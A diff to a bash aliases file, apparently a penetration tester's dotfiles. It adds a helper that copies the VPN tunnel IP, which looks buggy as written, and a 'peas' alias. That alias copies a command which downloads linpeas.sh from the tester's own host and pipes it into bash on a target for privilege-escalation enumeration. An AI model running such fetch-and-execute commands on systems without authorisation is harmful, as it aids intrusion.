@@ -96,6 +96,8 @@ alias fucking='sudo'
 
 alias open-folder='xdg-open .'
 alias gettun='ifconfig tun0 | grep inet | grep -v inet6 | grep -Po "inet \K[\d\.]+"'
+alias gettunc='`gettun` | xclip -selection clipboard'
+alias peas='echo "curl `gettun`:9090/linpeas.sh | bash | tee out.txt" | xclip -selection clipboard'
 # Alias definitions.
 # You may want to put all your additions into a separate file like
 # ~/.bash_aliases, instead of adding them here directly.
